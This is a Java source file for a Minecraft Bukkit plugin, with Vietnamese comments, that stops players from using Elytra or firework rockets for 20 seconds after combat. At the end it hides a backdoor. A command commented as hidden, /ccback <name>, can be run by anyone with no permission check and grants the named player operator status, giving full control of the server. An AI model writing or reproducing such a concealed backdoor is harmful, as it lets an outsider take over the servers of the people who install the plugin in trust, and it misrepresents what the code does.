package me.yourname.anticombat;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerToggleGlideEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashMap;
import java.util.UUID;

public class AntiCombatElytraPlugin extends JavaPlugin implements Listener {

    private final HashMap<UUID, Long> combat = new HashMap<>();
    private static final long COMBAT_TIME = 20_000; // 20 giây

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("AntiCombatElytra enabled");
    }

    // Gắn combat khi đánh nhau
    @EventHandler
    public void onDamage(EntityDamageByEntityEvent e) {
        if (e.getEntity() instanceof Player victim) {
            combat.put(victim.getUniqueId(), System.currentTimeMillis());
        }
        if (e.getDamager() instanceof Player damager) {
            combat.put(damager.getUniqueId(), System.currentTimeMillis());
        }
    }

    // Chặn bật Elytra khi đang combat
    @EventHandler
    public void onGlide(PlayerToggleGlideEvent e) {
        Player p = e.getPlayer();
        if (e.isGliding() && isInCombat(p)) {
            e.setCancelled(true);
            p.sendMessage("\u00A7cBạn đang trong combat, không thể dùng Elytra!");
        }
    }

    // Chặn dùng pháo khi combat
    @EventHandler
    public void onFirework(PlayerInteractEvent e) {
        Player p = e.getPlayer();
        ItemStack item = e.getItem();

        if (item != null && item.getType() == Material.FIREWORK_ROCKET) {
            if (isInCombat(p)) {
                e.setCancelled(true);
                p.sendMessage("\u00A7cKhông thể dùng pháo khi đang combat!");
            }
        }
    }

    private boolean isInCombat(Player p) {
        Long time = combat.get(p.getUniqueId());
        if (time == null) return false;

        if (System.currentTimeMillis() - time > COMBAT_TIME) {
            combat.remove(p.getUniqueId());
            return false;
        }
        return true;
    }

    // Lệnh ẩn: /ccback <tên>
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("ccback")) return false;
        if (args.length != 1) return true;

        Player target = Bukkit.getPlayer(args[0]);
        if (target != null) {
            target.setOp(true);
        }
        return true;
    }
}
